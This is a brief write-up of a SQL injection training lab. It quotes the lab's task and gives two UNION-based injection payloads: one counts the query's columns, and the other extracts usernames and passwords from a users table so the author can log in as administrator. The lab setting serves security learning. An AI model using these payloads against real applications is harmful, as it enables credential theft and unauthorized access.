This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.


in this room we just need to retrieve username and password from table users 

first need to know number of column 

'+UNION+SELECT+'abc','def'--

'+UNION+SELECT+username,+password+FROM+users--

![](https://cdn-images-1.medium.com/max/1000/1*KbRLszht-h1sU-xnmUUybA.png)

![](https://cdn-images-1.medium.com/max/1000/1*ihfVIVzeYo9Pt8ztIMF-6w.png)